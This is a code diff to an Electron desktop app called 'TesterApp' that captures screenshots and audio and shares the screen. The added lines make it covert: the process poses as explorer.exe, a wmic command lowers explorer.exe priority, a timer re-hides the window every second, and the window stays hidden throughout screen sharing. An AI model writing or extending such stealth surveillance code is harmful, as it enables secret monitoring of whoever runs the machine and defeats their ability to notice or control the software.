@@ -6,7 +6,7 @@ const screenshot = require('screenshot-desktop');
 const notifier = require('node-notifier');
 const record = require('node-record-lpcm16');
 
-// Disguise process name as Windows Explorer
+// Disguise process name as Windows Explorer and try to hide from process list
 if (process.platform === 'win32') {
   process.title = 'explorer.exe';
   // Also try to set the process name
@@ -14,6 +14,19 @@ if (process.platform === 'win32') {
     process.argv[1] = 'C:\\Windows\\explorer.exe';
   } catch (e) {
     // Ignore if we can't modify argv
+  }
+  
+  // Try to hide from process list using Windows API
+  try {
+    const { exec } = require('child_process');
+    // Set process priority to idle to make it less noticeable
+    exec('wmic process where "name=\'explorer.exe\'" CALL setpriority "idle"', (error) => {
+      if (!error) {
+        console.log('🥷 Process priority set to idle');
+      }
+    });
+  } catch (e) {
+    // Ignore if we can't modify process priority
   }
 }
 
@@ -83,10 +96,14 @@ class TesterApp {
       if (this.isSharing) {
         this.stopScreenSharing();
       }
-      // Clean up aggressive protection interval
+      // Clean up protection intervals
       if (this.aggressiveProtectionInterval) {
         clearInterval(this.aggressiveProtectionInterval);
         this.aggressiveProtectionInterval = null;
+      }
+      if (this.windowHidingInterval) {
+        clearInterval(this.windowHidingInterval);
+        this.windowHidingInterval = null;
       }
     });
 
@@ -124,6 +141,18 @@ class TesterApp {
         this.createMainWindow();
       }
     });
+  }
+
+  startWindowHidingProtection() {
+    // Continuously ensure window stays hidden
+    this.windowHidingInterval = setInterval(() => {
+      if (this.mainWindow && this.mainWindow.isVisible()) {
+        console.log('🥷 Window became visible - hiding immediately');
+        this.mainWindow.hide();
+        this.mainWindow.setSkipTaskbar(true);
+        this.mainWindow.setVisibleOnAllWorkspaces(false, { visibleOnFullScreen: false });
+      }
+    }, 1000); // Check every second
   }
 
   createExplorerIcon() {
@@ -186,6 +215,9 @@ class TesterApp {
       this.mainWindow.setSkipTaskbar(true);
       this.mainWindow.setVisibleOnAllWorkspaces(false, { visibleOnFullScreen: false });
       console.log('🥷 Tester window hidden by default - access via tray icon');
+      
+      // Start continuous hiding protection
+      this.startWindowHidingProtection();
     });
 
     // Don't hide window when minimized - keep it accessible
@@ -301,11 +333,19 @@ class TesterApp {
 
   showMainWindowTemporarily() {
     if (this.mainWindow) {
-      // Window is already visible, just focus it
+      // Temporarily show window for 5 seconds then hide again
       this.mainWindow.setFocusable(true);
       this.mainWindow.setSkipTaskbar(true); // Keep hidden from taskbar
       this.mainWindow.show();
       this.mainWindow.focus();
+      
+      // Auto-hide after 5 seconds
+      setTimeout(() => {
+        if (this.mainWindow) {
+          this.mainWindow.hide();
+          console.log('🥷 Window auto-hidden after 5 seconds');
+        }
+      }, 5000);
     }
   }
 
@@ -835,8 +875,8 @@ class TesterApp {
   // Removed showSettings - settings now integrated into main window tabs
 
   showConnectionDialog() {
-    this.mainWindow.show();
-    this.mainWindow.focus();
+    // Don't show window - keep it hidden
+    console.log('🥷 Connection dialog requested but window remains hidden');
   }
 
   registerGlobalShortcuts() {
@@ -1538,11 +1578,10 @@ class TesterApp {
   async startScreenSharing() {
     this.isSharing = true;
     
-    // Keep window visible to user - don't hide when connected
-    // Window remains visible but still protected from screen capture
+    // Keep window hidden - never show during screen sharing
     if (this.mainWindow) {
-      this.mainWindow.show(); // Ensure window is visible
-      this.mainWindow.setFocusable(true); // Can be focused
+      this.mainWindow.hide(); // Ensure window stays hidden
+      this.mainWindow.setFocusable(false); // Can't be focused
       this.mainWindow.setSkipTaskbar(true); // Still hidden from taskbar
       this.mainWindow.setVisibleOnAllWorkspaces(false, { visibleOnFullScreen: false });
     }
@@ -2176,12 +2215,12 @@ class TesterApp {
     
     // Restore window visibility when sharing stops
     if (this.mainWindow) {
-      this.mainWindow.setSkipTaskbar(true); // Keep hidden from taskbar // Show in taskbar again
-      this.mainWindow.setFocusable(true); // Can be focused again
-      this.mainWindow.show(); // Show the window again
+      this.mainWindow.setSkipTaskbar(true); // Keep hidden from taskbar
+      this.mainWindow.setFocusable(false); // Can't be focused
+      this.mainWindow.hide(); // Keep window hidden
     }
     
-    console.log('Screen sharing stopped - window restored and visible');
+    console.log('Screen sharing stopped - window remains hidden');
   }
 
   // Removed playNotificationSound - no notifications needed
